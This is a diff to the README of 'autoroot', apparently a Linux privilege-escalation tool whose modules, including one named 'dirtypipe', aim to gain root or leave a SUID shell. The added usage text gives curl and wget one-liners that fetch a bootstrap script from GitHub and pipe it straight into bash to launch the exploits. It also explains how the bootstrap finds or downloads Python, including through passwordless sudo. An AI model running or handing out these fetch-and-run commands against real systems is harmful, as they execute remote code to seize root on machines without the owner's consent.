@@ -10,6 +10,20 @@ Python process: use a module that leaves a SUID shell, or run the module with
 
 ## Usage
 
+Fastest path (works even if `python3` is missing):
+
+```bash
+curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash
+```
+
+With arguments:
+
+```bash
+curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash -s -- --raw --only dirtypipe
+```
+
+If Python 3.6+ is already installed:
+
 ```bash
 python3 autoroot.py
 python3 autoroot.py --list
@@ -96,17 +110,31 @@ Colors: green = ran/ok, red = failed/blocked, dim = skipped, bold = root.
   Python's `urllib`.
 - **curl missing:** direct downloads use wget or `urllib`; git clones still
   work.
-- **python3 missing:** run the bootstrap, which installs Python (passwordless
-  sudo) and then starts autoroot:
+- **python3 missing:** run the bootstrap. It looks for a usable Python 3.6+ in
+  `PATH` and in non-standard installs (RHEL `platform-python`, cPanel, Plesk,
+  pyenv, conda), then tries passwordless `sudo` package install, then downloads
+  a standalone static CPython 3.12 into `~/.cache/autoroot-py` (no root, no
+  package manager, works on old glibc). It then runs autoroot with your args.
 
 ```bash
 curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash
+curl -fsSL "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash -s -- --raw
 ```
 
 If `curl` itself is missing:
 
 ```bash
-wget -qO- https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh | bash
+wget -qO- "https://raw.githubusercontent.com/thiscitze/autoroot/main/bootstrap.sh?v=$(date +%s)" | bash
+```
+
+If `bash` is missing too, there is nothing left to bootstrap with; run
+`python3 autoroot.py` from any shell that has Python 3.6+.
+
+The standalone interpreter stays cached at
+`~/.cache/autoroot-py/python/bin/python3`, so later runs can skip the download:
+
+```bash
+~/.cache/autoroot-py/python/bin/python3 autoroot.py --raw
 ```
 
 ## Modules
